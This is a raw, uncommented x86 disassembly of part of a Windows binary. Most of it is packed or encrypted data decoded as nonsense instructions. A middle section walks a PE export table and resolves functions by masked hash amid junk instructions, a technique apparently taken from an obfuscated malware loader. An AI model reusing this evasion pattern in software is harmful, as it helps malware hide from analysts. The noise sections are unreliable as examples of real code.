  4047ae:	ins    DWORD PTR es:[edi],dx
  4047af:	dec    ebx
  4047b0:	push   ss
  4047b1:	add    ah,BYTE PTR [ebp+0x62]
  4047b4:	fmul   QWORD PTR [edx+0x57]
  4047b7:	ror    DWORD PTR [ebx+0x4],cl
  4047ba:	(bad)  
  4047bb:	xchg   DWORD PTR [edi+0x4e01d32f],esp
  4047c1:	pop    ds
  4047c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4047c3:	mov    ah,0xab
  4047c5:	dec    edi
  4047c6:	pusha  
  4047c7:	lods   eax,DWORD PTR ds:[esi]
  4047c8:	mov    bh,0x26
  4047ca:	xchg   BYTE PTR [ebp-0x58db190d],bl
  4047d0:	push   esp
  4047d1:	or     BYTE PTR [edi+0x4a51d2dc],0xb3
  4047d8:	fsub   QWORD PTR [esi+ebp*1]
  4047db:	pop    ds
  4047dc:	lods   eax,DWORD PTR ds:[esi]
  4047dd:	lea    eax,[edx+esi*8]
  4047e0:	xchg   esp,eax
  4047e1:	add    al,BYTE PTR [eax+0x53]
  4047e4:	in     al,dx
  4047e5:	(bad)  
  4047e6:	stos   BYTE PTR es:[edi],al
  4047e7:	mov    esi,0x93570b20
  4047ec:	repz and DWORD PTR [edx],ebx
  4047ef:	lahf   
  4047f0:	loopne 0x4047d9
  4047f2:	test   DWORD PTR ds:0xf003aa40,0x7ded90d0
  4047fc:	cs in  al,0x35
  4047ff:	gs push edx
  404801:	or     DWORD PTR [esi-0x7958635f],ebx
  404807:	jbe    0x4047db
  404809:	call   0xd089:0x3d0478fe
  404810:	ficom  DWORD PTR [ebp+esi*2+0x79]
  404814:	adc    edx,DWORD PTR [eax]
  404816:	enter  0xa0b0,0x99
  40481a:	ins    DWORD PTR es:[edi],dx
  40481b:	es pop ebp
  40481d:	xor    al,0xbc
  40481f:	xor    DWORD PTR [eax-0x59],0xffffffa0
  404823:	(bad)  
  404824:	xor    dh,BYTE PTR ds:0xdec01e5f
  40482a:	mov    eax,ds:0x67eaff31
  40482f:	fild   WORD PTR [esi]
  404831:	xchg   esi,eax
  404832:	clc    
  404833:	adc    edi,DWORD PTR [eax+0x77f1239d]
  404839:	iret   
  40483a:	sbb    cl,ch
  40483c:	sub    edi,eax
  40483e:	adc    al,0xe6
  404840:	pop    esp
  404841:	dec    esp
  404842:	pop    esp
  404843:	mov    BYTE PTR [eax],cl
  404845:	inc    ebx
  404846:	or     cl,BYTE PTR [ebp-0x27a8ddcc]
  40484c:	cmc    
  40484d:	xchg   esp,eax
  40484e:	cmp    DWORD PTR ds:0x27c25af2,ecx
  404854:	in     eax,dx
  404855:	push   es
  404856:	(bad)  
  404857:	ficomp WORD PTR [edx-0x36]
  40485a:	push   edi
  40485b:	dec    ebp
  40485c:	jmp    0x312e00a4
  404861:	jmp    0x4c94:0xd5cda4ad
  404868:	cmp    eax,0xc37f15a
  40486d:	out    0xc6,eax
  40486f:	sub    al,0xeb
  404871:	pop    esi
  404872:	adc    DWORD PTR [esi],edi
  404874:	aaa    
  404875:	pop    es
  404876:	mov    dh,0xb3
  404878:	push   ebp
  404879:	cmp    eax,0xf40e3dd8
  40487e:	adc    al,BYTE PTR [ebp+ebx*8+0x48]
  404882:	in     eax,0x8d
  404884:	imul   ebx,DWORD PTR [ebp-0x1f827229],0xffffffeb
  40488b:	push   ds
  40488c:	push   ebp
  40488d:	aaa    
  40488e:	jp     0x404862
  404890:	test   al,0xee
  404892:	push   esi
  404893:	pop    ebp
  404894:	cmp    DWORD PTR [esi+0x5f],0x26
  404898:	das    
  404899:	(bad)  
  40489a:	xlat   BYTE PTR ds:[ebx]
  40489b:	dec    edi
  40489c:	sbb    al,dl
  40489e:	lods   eax,DWORD PTR ds:[esi]
  40489f:	pop    edi
  4048a0:	xchg   edx,eax
  4048a1:	cmp    bl,BYTE PTR [ebx]
  4048a3:	and    cl,BYTE PTR ds:0x19256e42
  4048a9:	jmp    0x3a664643
  4048ae:	retf   
  4048af:	jne    0x404897
  4048b1:	lea    esi,[edx]
  4048b3:	ret    0x1413
  4048b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048b7:	cmp    al,0x39
  4048b9:	(bad)  
  4048ba:	inc    DWORD PTR [edx+0x5ef621a9]
  4048c0:	mov    eax,ds:0xf5abba23
  4048c5:	jbe    0x40492c
  4048c7:	xor    esp,DWORD PTR [esi-0x57ca2ec6]
  4048cd:	fcmovu st,st(2)
  4048cf:	std    
  4048d0:	jmp    FWORD PTR [eax]
  4048d2:	ins    DWORD PTR es:[edi],dx
  4048d3:	xchg   ebp,eax
  4048d4:	push   es
  4048d5:	mov    BYTE PTR [ecx],dl
  4048d7:	mov    cl,bl
  4048d9:	sub    eax,0xd08fb8c7
  4048de:	xor    cl,dh
  4048e0:	fsub   QWORD PTR [ebx]
  4048e2:	mov    bh,0xfb
  4048e4:	out    dx,eax
  4048e5:	out    0xa9,eax
  4048e7:	or     DWORD PTR [edi+0x70],ebp
  4048ea:	cwde   
  4048eb:	pusha  
  4048ec:	and    dh,bl
  4048ee:	scas   al,BYTE PTR es:[edi]
  4048ef:	in     eax,0x82
  4048f1:	jnp    0x40489a
  4048f3:	popf   
  4048f4:	sbb    BYTE PTR [ebx],0xd6
  4048f7:	aaa    
  4048f8:	ss jl  0x404968
  4048fb:	jno    0x404942
  4048fd:	addr16 (bad) 
  4048ff:	xchg   ebx,eax
  404900:	jnp    0x404911
  404902:	inc    esp
  404903:	fidiv  WORD PTR [eax+ecx*1]
  404906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404907:	and    eax,0xc51b7db2
  40490c:	cld    
  40490d:	sub    ecx,edi
  40490f:	inc    esp
  404910:	ret    
  404911:	fild   DWORD PTR [edx-0x80]
  404914:	adc    al,0x69
  404916:	mov    dh,0x65
  404918:	jns    0x404925
  40491a:	ins    BYTE PTR es:[edi],dx
  40491b:	mov    edi,0x4a86481
  404920:	sub    DWORD PTR [edi],edi
  404922:	lods   eax,DWORD PTR ds:[esi]
  404923:	pop    esi
  404924:	sbb    ebp,DWORD PTR [ecx+0x61f2835a]
  40492a:	ret    
  40492b:	add    eax,0x21c4be51
  404930:	mov    al,ds:0x500abd71
  404935:	and    al,0xd6
  404937:	ins    DWORD PTR es:[edi],dx
  404938:	test   eax,ebp
  40493a:	stos   DWORD PTR es:[edi],eax
  40493b:	ret    
  40493c:	adc    cl,BYTE PTR [ecx-0x503ab100]
  404942:	fnstcw WORD PTR [esi+0x9319159]
  404948:	in     al,0xf6
  40494a:	inc    edi
  40494b:	pop    esi
  40494c:	outs   dx,BYTE PTR ds:[esi]
  40494d:	out    0x65,al
  40494f:	xchg   ebp,eax
  404950:	pop    ecx
  404951:	adc    BYTE PTR [esi+0x76],0xe6
  404955:	ins    BYTE PTR es:[edi],dx
  404956:	ins    DWORD PTR es:[edi],dx
  404957:	mov    eax,0xb55a5754
  40495d:	jle    0x404956
  40495f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404960:	cmp    DWORD PTR [edi+eiz*4+0x2d1418d8],edx
  404967:	mov    dl,ah
  404969:	jb     0x40490b
  40496b:	push   esp
  40496c:	and    eax,0x89227745
  404971:	lods   eax,DWORD PTR ds:[esi]
  404972:	mov    eax,0x97a4abc
  404977:	xchg   DWORD PTR [edi+0x2d],ebx
  40497a:	cwde   
  40497b:	inc    ebx
  40497c:	in     al,0x32
  40497e:	jge    0x40496b
  404980:	pop    edi
  404981:	inc    edi
  404982:	outs   dx,BYTE PTR ds:[esi]
  404983:	push   esi
  404984:	push   ds
  404985:	das    
  404986:	cmp    ecx,DWORD PTR [ecx-0x5d]
  404989:	rcl    BYTE PTR [esi],1
  40498b:	scas   al,BYTE PTR es:[edi]
  40498c:	jmp    0x404911
  40498e:	sub    BYTE PTR [ecx+edx*4-0x4c],bl
  404992:	jmp    0x207b:0x234036a1
  404999:	(bad)  
  40499b:	mov    ah,0xb6
  40499d:	mov    bh,0x7
  40499f:	mov    WORD PTR [edx-0x7b],gs
  4049a2:	or     BYTE PTR [edx+ebp*8],dh
  4049a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049a6:	aaa    
  4049a7:	xchg   edi,eax
  4049a8:	imul   edx,ebp,0x55
  4049ab:	push   es
  4049ac:	add    eax,0x721dd877
  4049b1:	popa   
  4049b2:	popfw  
  4049b4:	or     al,0x4c
  4049b6:	scas   al,BYTE PTR es:[edi]
  4049b7:	or     ch,BYTE PTR [edi+edi*8-0x754e0b81]
  4049be:	jge    0x404a2a
  4049c0:	and    eax,0x61e095a8
  4049c5:	cwde   
  4049c6:	adc    BYTE PTR ds:[edi+0x3432ba64],0xc8
  4049ce:	add    eax,0xaca2ad8a
  4049d3:	test   al,0x4e
  4049d5:	cmp    eax,0x3ffde83
  4049da:	inc    eax
  4049db:	in     eax,0xfc
  4049dd:	adc    al,0x3
  4049df:	(bad)  
  4049e0:	pop    ss
  4049e1:	in     eax,dx
  4049e2:	jmp    DWORD PTR [edi+0x585e8e70]
  4049e8:	jnp    0x404a0c
  4049ea:	jae    0x4049a4
  4049ec:	and    al,0x34
  4049ee:	jmp    0x44ca:0xe7b0e7e6
  4049f5:	mov    esi,0x5b6997
  4049fa:	mov    ?,WORD PTR [edx]
  4049fc:	cwde   
  4049fd:	adc    eax,0x72a910e2
  404a02:	mov    dl,0xd5
  404a04:	or     al,0x2c
  404a06:	cs es push eax
  404a09:	out    dx,al
  404a0a:	icebp  
  404a0b:	addr16 cmp eax,0x97b4aee1
  404a11:	mov    esi,0x7eaf4be7
  404a16:	(bad)  
  404a17:	sbb    BYTE PTR [ebp+edi*1-0xd],dh
  404a1b:	stos   DWORD PTR es:[edi],eax
  404a1c:	sahf   
  404a1d:	cmp    eax,0x8abf8e12
  404a22:	into   
  404a23:	ds pop es
  404a25:	mov    ebx,0x1713eb12
  404a2a:	push   ebp
  404a2b:	and    DWORD PTR [esi-0x35f4cebe],0x9682f8c2
  404a35:	and    BYTE PTR [edi-0x2bda4c4a],bl
  404a3b:	aaa    
  404a3c:	and    esi,DWORD PTR [ecx-0x22]
  404a3f:	mov    eax,0x3f90e2a5
  404a44:	daa    
  404a45:	mov    BYTE PTR [edx+esi*4],bh
  404a48:	mov    ebx,ds
  404a4a:	out    0x8b,al
  404a4c:	inc    edx
  404a4d:	mov    al,ds:0xb7056df1
  404a52:	or     bh,BYTE PTR [edi-0x70a648c6]
  404a58:	add    cl,BYTE PTR [ebx-0x66]
  404a5b:	jbe    0x404a09
  404a5d:	sub    ecx,DWORD PTR [edi]
  404a5f:	adc    eax,0x96e69967
  404a64:	sub    al,dl
  404a66:	retf   0x128f
  404a69:	add    DWORD PTR [ecx+0x6873e6da],ebx
  404a6f:	push   edx
  404a70:	test   al,dl
  404a72:	inc    eax
  404a73:	into   
  404a74:	pop    ebx
  404a75:	inc    ebx
  404a76:	cs inc ebp
  404a78:	pop    ecx
  404a79:	add    DWORD PTR [edi-0x11587209],edi
  404a7f:	es jbe 0x404aac
  404a82:	mov    cl,0x70
  404a84:	cmp    ah,ch
  404a86:	lods   al,BYTE PTR ds:[esi]
  404a87:	fstp   TBYTE PTR [edi+0x1072f7b4]
  404a8d:	sbb    BYTE PTR [si-0x66],dh
  404a91:	mov    DWORD PTR [ecx+0x26],edi
  404a94:	xor    edx,esi
  404a96:	inc    ebx
  404a97:	cmp    DWORD PTR [eax],ecx
  404a99:	push   edi
  404a9a:	jae    0x404a40
  404a9c:	loop   0x404a4f
  404a9e:	not    DWORD PTR [ebx]
  404aa0:	shr    DWORD PTR [ebx+0x62568848],1
  404aa6:	das    
  404aa7:	shl    BYTE PTR [ebx+ebp*8-0x4eff6016],1
  404aae:	lea    ecx,[ebp+0x467ec828]
  404ab4:	xchg   edi,eax
  404ab5:	div    BYTE PTR [edx+0x49]
  404ab8:	lock mov bh,BYTE PTR [edi+ebp*8+0x44eb55e2]
  404ac0:	mov    bl,0x48
  404ac2:	ins    BYTE PTR es:[edi],dx
  404ac3:	rcr    DWORD PTR [ebp+0x103a8268],1
  404ac9:	cs mov al,0x67
  404acc:	shr    DWORD PTR [edx+0x37],cl
  404acf:	jb     0x404af5
  404ad1:	ins    BYTE PTR es:[edi],dx
  404ad2:	out    0xfe,eax
  404ad4:	addr16 cmc 
  404ad6:	dec    ebx
  404ad7:	xchg   esi,eax
  404ad8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ad9:	rol    BYTE PTR [ecx+0x18],cl
  404adc:	fsincos 
  404ade:	icebp  
  404adf:	aam    0xa9
  404ae1:	in     al,0x27
  404ae3:	popa   
  404ae4:	mov    BYTE PTR [esi],bl
  404ae6:	xor    dh,bl
  404ae8:	inc    ecx
  404ae9:	sub    al,0x3a
  404aeb:	cmc    
  404aec:	(bad)  
  404aed:	dec    esp
  404aee:	call   0xd7a7:0x2ef76673
  404af5:	rep outs dx,DWORD PTR ds:[esi]
  404af7:	jg     0x404ae2
  404af9:	push   es
  404afa:	jne    0x404b2b
  404afc:	push   esp
  404afd:	ss mov ecx,0xfc781368
  404b03:	sub    DWORD PTR [edi-0x662d1964],edx
  404b09:	cmp    esp,DWORD PTR [edi]
  404b0b:	scas   al,BYTE PTR es:[edi]
  404b0c:	fstp   TBYTE PTR [eax]
  404b0e:	sbb    al,0x8e
  404b10:	adc    al,0xe
  404b12:	and    BYTE PTR [eax+0x489de5a4],ah
  404b18:	cmc    
  404b19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b1a:	outs   dx,DWORD PTR ds:[esi]
  404b1b:	xor    DWORD PTR [ecx+0xf06f364],0xb38e2f61
  404b25:	rol    edx,0xb7
  404b28:	mov    esp,0xf6496428
  404b2d:	int    0xb0
  404b2f:	addr16 nop
  404b31:	fdivr  DWORD PTR [edi+0x465d8edc]
  404b37:	xchg   edx,eax
  404b38:	cmp    bh,BYTE PTR [eax-0x186e5293]
  404b3e:	shl    esi,cl
  404b40:	stc    
  404b41:	adc    edi,DWORD PTR [ebx-0x70]
  404b44:	loope  0x404ad8
  404b46:	sbb    DWORD PTR [ecx],edi
  404b48:	(bad)  
  404b49:	mov    al,0x4e
  404b4b:	xor    DWORD PTR [ecx+eiz*4-0x4353a537],ebx
  404b52:	sbb    al,0x3c
  404b54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b55:	cmp    edx,DWORD PTR [edx]
  404b57:	sub    eax,0xa3c65e23
  404b5c:	aad    0xbc
  404b5e:	mov    ds:0xa4a24499,eax
  404b63:	mov    DWORD PTR [edx-0x45],edi
  404b66:	(bad)  
  404b67:	aam    0xfa
  404b69:	std    
  404b6a:	fcmovnbe st,st(6)
  404b6c:	pop    esi
  404b6d:	outs   dx,BYTE PTR ds:[esi]
  404b6e:	adc    ah,BYTE PTR [ebx+0x250b28a6]
  404b74:	cmc    
  404b75:	(bad)  
  404b77:	push   edi
  404b78:	imul   edi,DWORD PTR [ecx-0x29],0xffffffbe
  404b7c:	test   BYTE PTR [ebp+0x53bb1647],ch
  404b82:	dec    edx
  404b83:	mov    ecx,0xad48d255
  404b88:	fs in  al,dx
  404b8a:	ins    DWORD PTR es:[edi],dx
  404b8b:	mul    DWORD PTR [ebx+0x6abbc8c5]
  404b91:	xor    DWORD PTR [edx-0xd],ebp
  404b94:	lahf   
  404b95:	lods   al,BYTE PTR ds:[esi]
  404b96:	add    DWORD PTR [ebx+0xa],esi
  404b99:	mov    ah,0x8a
  404b9b:	cmp    eax,0x76743e82
  404ba0:	adc    al,bl
  404ba2:	and    al,0x33
  404ba4:	cwde   
  404ba5:	loope  0x404bfd
  404ba7:	rcr    edi,cl
  404ba9:	cmc    
  404baa:	repnz out dx,al
  404bac:	add    DWORD PTR [esi],ebp
  404bae:	add    al,0x20
  404bb0:	and    DWORD PTR [edi-0x642c9df5],edi
  404bb6:	repz jmp 0x473c13e7
  404bbc:	mov    ch,0x8f
  404bbe:	fmul   QWORD PTR [ebx]
  404bc0:	fbld   TBYTE PTR [ebx]
  404bc2:	or     bh,BYTE PTR [eax+0x3e]
  404bc5:	mov    al,ds:0xa6c2a7da
  404bca:	fsubrp st(2),st
  404bcc:	ja     0x404b9f
  404bce:	ds pop ebp
  404bd0:	int    0xef
  404bd2:	out    dx,al
  404bd3:	jbe    0x404c2e
  404bd5:	js     0x404b8e
  404bd7:	rol    DWORD PTR [edx+0x3a5dec17],0x65
  404bde:	dec    edi
  404bdf:	out    dx,eax
  404be0:	in     eax,0x3e
  404be2:	pop    edx
  404be3:	icebp  
  404be4:	xchg   ecx,eax
  404be5:	jg     0x404c5b
  404be7:	push   bp
  404be9:	cmp    BYTE PTR [edi],0x1e
  404bec:	loope  0x404bf9
  404bee:	mov    al,ds:0xa448c9b
  404bf3:	hlt    
  404bf4:	aaa    
  404bf5:	mov    ds:0x4d78cb6,al
  404bfa:	retf   
  404bfb:	jmp    0x46a2:0xe5aca05f
  404c02:	pop    edi
  404c03:	aad    0x6e
  404c05:	push   es
  404c06:	xlat   BYTE PTR ds:[ebx]
  404c07:	push   eax
  404c08:	adc    DWORD PTR [edx-0x1ee9be9d],esp
  404c0e:	leave  
  404c0f:	icebp  
  404c10:	(bad)  
  404c11:	retf   
  404c12:	inc    ecx
  404c13:	xchg   esp,eax
  404c14:	jge    0x404b9b
  404c16:	bound  edx,QWORD PTR [eax+0x27]
  404c19:	xchg   ebx,eax
  404c1a:	xchg   al,bl
  404c1c:	push   ecx
  404c1d:	mov    ch,0x1
  404c1f:	jo     0x404c77
  404c21:	outs   dx,DWORD PTR ds:[esi]
  404c22:	retf   
  404c23:	add    ecx,DWORD PTR [esi-0x1f264500]
  404c29:	sbb    ebx,ebp
  404c2b:	bound  ebp,QWORD PTR [ebp-0x75]
  404c2e:	lds    ecx,FWORD PTR [edi+0x5]
  404c31:	mov    WORD PTR [ebx],fs
  404c33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c34:	and    al,0xf2
  404c36:	pop    ebp
  404c37:	lods   al,BYTE PTR ds:[esi]
  404c38:	mov    ebp,0x9f32ba71
  404c3d:	push   es
  404c3e:	mov    es,WORD PTR [edi]
  404c40:	loope  0x404c43
  404c42:	push   eax
  404c43:	mov    ecx,DWORD PTR [ebp-0x6f7c3bcb]
  404c49:	inc    edi
  404c4a:	add    al,0xcf
  404c4c:	push   esp
  404c4d:	sahf   
  404c4e:	dec    ebx
  404c4f:	mov    bl,0xd9
  404c51:	es scas al,BYTE PTR es:[edi]
  404c53:	mov    BYTE PTR [ebp-0x3ba74f5],0x8b
  404c5a:	dec    ebp
  404c5b:	call   0xc7440f93
  404c60:	cmp    ecx,eax
  404c62:	je     0x404e26
  404c68:	mov    eax,ds:0x422014
  404c6d:	sbb    DWORD PTR ds:0x420fb4,eax
  404c73:	mov    eax,DWORD PTR [ebp-0x18]
  404c76:	mov    eax,DWORD PTR [eax+0x18]
  404c79:	mov    DWORD PTR [ebp-0x24],eax
  404c7c:	dec    DWORD PTR ds:0x420fa4
  404c82:	mov    eax,DWORD PTR [ebp-0x18]
  404c85:	mov    ecx,DWORD PTR ds:0x420e7a
  404c8b:	xor    ecx,DWORD PTR ds:0x422010
  404c91:	mov    DWORD PTR ds:0x420e7a,ecx
  404c97:	mov    ecx,DWORD PTR [ebp+0x8]
  404c9a:	add    ecx,DWORD PTR [eax+0x20]
  404c9d:	mov    DWORD PTR [ebp-0x2c],ecx
  404ca0:	or     eax,DWORD PTR ds:0x420efc
  404ca6:	mov    eax,DWORD PTR [ebp-0x18]
  404ca9:	mov    ecx,DWORD PTR [ebp+0x8]
  404cac:	xor    DWORD PTR ds:0x420f70,0x420fa0
  404cb6:	add    ecx,DWORD PTR [eax+0x24]
  404cb9:	xor    eax,eax
  404cbb:	add    eax,DWORD PTR ds:0x420e96
  404cc1:	xor    DWORD PTR ds:0x422004,eax
  404cc7:	mov    DWORD PTR [ebp-0x34],ecx
  404cca:	mov    eax,DWORD PTR [ebp-0x18]
  404ccd:	mov    ecx,DWORD PTR [ebp+0x8]
  404cd0:	xor    DWORD PTR ds:0x422018,0x422010
  404cda:	add    ecx,DWORD PTR [eax+0x1c]
  404cdd:	mov    DWORD PTR ds:0x420ea2,ebx
  404ce3:	mov    eax,edi
  404ce5:	mov    DWORD PTR ds:0x420ef8,0x31e9
  404cef:	mov    DWORD PTR [ebp-0x18],ecx
  404cf2:	mov    DWORD PTR ds:0x422000,0x101a
  404cfc:	jmp    0x404dee
  404d01:	mov    DWORD PTR ds:0x420fb4,0x15
  404d0b:	cmp    DWORD PTR ds:0x420fb4,0x0
  404d12:	je     0x404d62
  404d18:	cmp    DWORD PTR ds:0x420fb4,0x8
  404d1f:	jne    0x404d34
  404d25:	push   DWORD PTR [ebp-0x24]
  404d28:	push   DWORD PTR [ebp-0x20]
  404d2b:	push   DWORD PTR [ebp-0x20]
  404d2e:	call   DWORD PTR ds:0x4247e1
  404d34:	cmp    DWORD PTR ds:0x420fb4,0x9
  404d3b:	jne    0x404d50
  404d41:	xor    edx,edx
  404d43:	add    edx,DWORD PTR ds:0x420fb4
  404d49:	dec    edx
  404d4a:	mov    DWORD PTR ds:0x420fb4,edx
  404d50:	mov    edx,DWORD PTR ds:0x420fb4
  404d56:	dec    edx
  404d57:	mov    DWORD PTR ds:0x420fb4,edx
  404d5d:	jmp    0x404d0b
  404d62:	mov    ecx,DWORD PTR [ebp-0x2c]
  404d65:	xor    edx,DWORD PTR ds:0x420e96
  404d6b:	mov    edx,DWORD PTR [ebp+0x8]
  404d6e:	add    DWORD PTR ds:0x420fb0,0x420f70
  404d78:	add    edx,DWORD PTR [ecx+esi*4]
  404d7b:	mov    DWORD PTR [ebp-0x28],edx
  404d7e:	movzx  ecx,BYTE PTR ds:0x420f00
  404d85:	or     DWORD PTR ds:0x420e7a,ecx
  404d8b:	mov    ecx,DWORD PTR [ebp-0x4]
  404d8e:	mov    edx,DWORD PTR [ebp-0x28]
  404d91:	adc    DWORD PTR ds:0x420fb4,0x420f00
  404d9b:	xor    ecx,ebx
  404d9d:	add    ecx,eax
  404d9f:	cmp    edx,ecx
  404da1:	mov    DWORD PTR ds:0x422000,0x2434
  404dab:	je     0x404dee
  404db1:	jmp    0x404dda
  404db6:	mov    ecx,DWORD PTR [ebp-0x4]
  404db9:	mov    edx,DWORD PTR [ebp-0x8]
  404dbc:	xor    ecx,ebx
  404dbe:	add    ecx,eax
  404dc0:	cmp    edx,ecx
  404dc2:	je     0x404e32
  404dc8:	mov    ecx,DWORD PTR [ebp-0x4]
  404dcb:	mov    edx,DWORD PTR [ebp-0x30]
  404dce:	xor    ecx,ebx
  404dd0:	add    ecx,eax
  404dd2:	cmp    edx,ecx
  404dd4:	je     0x404e41
  404dda:	lea    eax,[ebp-0x8]
  404ddd:	push   eax
  404dde:	push   DWORD PTR [ebp-0x28]
  404de1:	push   DWORD PTR [ebp+0xc]
  404de4:	call   0x410c6c
  404de9:	mov    eax,0x3272dd
  404dee:	mov    ecx,DWORD PTR [ebp-0x4]
  404df1:	mov    edx,DWORD PTR [ebp-0x8]
  404df4:	xor    ecx,ebx
  404df6:	add    ecx,eax
  404df8:	cmp    edx,ecx
  404dfa:	je     0x404e15
  404e00:	mov    ecx,DWORD PTR [ebp-0x34]
  404e03:	movzx  ecx,WORD PTR [ecx+esi*2]
  404e07:	mov    edx,DWORD PTR [ebp-0x18]
  404e0a:	mov    ecx,DWORD PTR [edx+ecx*4]
  404e0d:	mov    DWORD PTR [ebp-0x38],ecx
  404e10:	jmp    0x404db6
  404e15:	mov    ecx,DWORD PTR [ebp-0x14]
  404e18:	xor    ecx,ebx
  404e1a:	lea    esi,[esi+ecx*1+0x3272dd]
  404e21:	jmp    0x402787
  404e26:	mov    eax,DWORD PTR [ebp-0x4]
  404e29:	xor    eax,ebx
  404e2b:	add    eax,edi
  404e2d:	jmp    0x407332
  404e32:	mov    eax,DWORD PTR [ebp-0x4]
  404e35:	xor    eax,ebx
  404e37:	add    eax,0x3272dd
  404e3c:	jmp    0x407332
  404e41:	mov    ecx,DWORD PTR [ebp-0x38]
  404e44:	add    ecx,DWORD PTR [ebp+0x8]
  404e47:	mov    DWORD PTR [ebp-0x10],ecx
  404e4a:	mov    ecx,DWORD PTR [ebp-0x1c]
  404e4d:	test   ecx,ecx
  404e4f:	je     0x4072bd
  404e55:	mov    DWORD PTR [ebp-0x20],0x0
  404e5c:	push   0x3
  404e5e:	xor    edx,edx
  404e60:	pop    edx
  404e61:	add    edx,0x8
  404e64:	push   edx
  404e65:	pop    ecx
  404e66:	push   0x6
  404e68:	dec    ecx
  404e69:	pop    ebx
  404e6a:	dec    ebx
  404e6b:	xchg   ebx,ecx
  404e6d:	sub    ebx,ecx
  404e6f:	xchg   ebx,ecx
  404e71:	dec    ecx
  404e72:	mov    eax,DWORD PTR [ebp-0x1c]
  404e75:	imul   eax,ecx
  404e78:	sub    esp,eax
  404e7a:	mov    DWORD PTR [ebp-0x20],esp
  404e7d:	mov    eax,DWORD PTR [ebp-0x4]
  404e80:	mov    ecx,0x7510896
  404e85:	jmp    0x407212
  404e8a:	lock into 
  404e8c:	inc    esi
  404e8d:	push   cs
  404e8e:	mov    BYTE PTR [esi-0x8],dh
  404e91:	mov    al,0xbe
  404e93:	(bad)  
  404e94:	fs cld 
  404e96:	xchg   edi,eax
  404e97:	cwde   
  404e98:	dec    eax
  404e99:	(bad)  
  404e9b:	pop    edi
  404e9c:	jp     0x404f18
  404e9e:	or     bl,BYTE PTR [edi+0x7a]
  404ea1:	jp     0x404e31
  404ea3:	(bad)  
  404ea4:	push   0xe25c16e7
  404ea9:	pop    eax
  404eaa:	mov    bl,0xe
  404eac:	ror    ecx,0x9a
  404eaf:	sbb    eax,0x40bf96a0
  404eb4:	sbb    edi,DWORD PTR [di+0x58]
  404eb8:	or     BYTE PTR [ebx],dh
  404eba:	gs or  eax,0x212623cf
  404ec0:	int    0x84
  404ec2:	sub    eax,0xb48c0631
  404ec7:	pushf  
  404ec8:	add    eax,0x605bca88
  404ecd:	mov    dl,0x19
  404ecf:	and    al,0x63
  404ed1:	in     al,0x5b
  404ed3:	les    esp,FWORD PTR ds:0x49c24367
  404ed9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404eda:	(bad)  [eax-0x260d060a]
  404ee0:	(bad)  [edx+0xb8c3cc2]
  404ee6:	push   ds
  404ee7:	mov    edx,0x12f64cba
  404eec:	lods   eax,DWORD PTR ds:[esi]
  404eed:	adc    BYTE PTR [esi-0x308f8ac3],bh
  404ef3:	mov    dh,0x1d
  404ef5:	ret    
  404ef6:	daa    
  404ef7:	cdq    
  404ef8:	mov    ah,0x40
  404efa:	imul   ebx,eax,0xa55124ba
  404f00:	test   DWORD PTR [esi+0x3be830c6],ebp
  404f06:	xor    bh,bh
  404f08:	adc    DWORD PTR [eax+edx*2-0x6e],0x27
  404f0d:	jmp    0xa458:0x26bf4fed
  404f14:	popa   
  404f15:	lds    ebx,FWORD PTR [esi]
  404f17:	or     eax,0xa8f89ee9
  404f1c:	je     0x404f04
  404f1e:	inc    esp
  404f1f:	adc    ebp,edx
  404f21:	test   al,0xfa
  404f23:	mov    bl,0x54
  404f25:	outs   dx,DWORD PTR ds:[esi]
  404f26:	jbe    0x404fa2
  404f28:	jge    0x404f6f
  404f2a:	and    ah,dh
  404f2c:	je     0x404f30
  404f2e:	mov    eax,ds:0x5017c787
  404f33:	lahf   
  404f34:	cmp    BYTE PTR [ebx],al
  404f36:	cmp    cl,BYTE PTR [edi+ebx*8+0x499e79c]
  404f3d:	jo     0x404efc
  404f3f:	ret    
  404f40:	(bad)  
  404f41:	and    BYTE PTR [esi+edx*4+0x30],ch
  404f45:	adc    al,0x98
  404f47:	(bad)  
  404f48:	and    ah,bl
  404f4a:	(bad)  
  404f4b:	rcl    BYTE PTR [ecx-0x78215829],1
  404f51:	add    al,0xb5
  404f53:	call   0x52c1:0x72c18eae
  404f5a:	shr    DWORD PTR [ebx+esi*4],0x33
  404f5e:	pop    ebx
  404f5f:	popa   
  404f60:	(bad)  [edi+eiz*1+0x28]
  404f64:	in     al,dx
  404f65:	fisttp QWORD PTR [ecx]
  404f67:	mov    WORD PTR [edi-0x2ea04a2a],es
  404f6d:	mov    edi,0xf77197d8
  404f72:	mov    eax,0xbe1d4782
  404f77:	cmp    DWORD PTR [ebx-0xf4fae58],esi
  404f7d:	ds sub dh,cl
  404f80:	sub    DWORD PTR [edi+0x43],edx
  404f83:	stc    
  404f84:	push   eax
  404f85:	int3   
  404f86:	xchg   esi,eax
  404f87:	cld    
  404f88:	jmp    0xf44f:0xe0abcef0
  404f8f:	sbb    DWORD PTR [ecx+0x6a410544],esi
  404f95:	retf   0xf68a
  404f98:	jecxz  0x404faf
  404f9a:	mov    edi,0xb322408
  404f9f:	mov    DWORD PTR [edi],esp
  404fa1:	add    ah,ch
  404fa3:	push   ecx
  404fa4:	ror    esi,0x2d
  404fa7:	imul   edi,DWORD PTR [esi-0x49c130fb],0xfffffff6
  404fae:	mov    ds:0x9410a47d,al
  404fb3:	push   0x16
  404fb5:	and    DWORD PTR [ebp-0x4db8b308],eax
  404fbb:	sub    DWORD PTR [ecx-0x3f9703fb],esp
  404fc1:	or     ecx,eax
  404fc3:	mov    DWORD PTR [eax+edi*2],esp
  404fc6:	std    
  404fc7:	inc    edx
  404fc8:	popa   
  404fc9:	adc    bl,BYTE PTR [ecx]
  404fcb:	xor    ecx,DWORD PTR [eax]
  404fcd:	pop    es
  404fce:	cs into 
  404fd0:	(bad)  
  404fd1:	cmp    esi,DWORD PTR [esi]
  404fd3:	inc    ebp
  404fd4:	mov    eax,ds:0x531d6dca
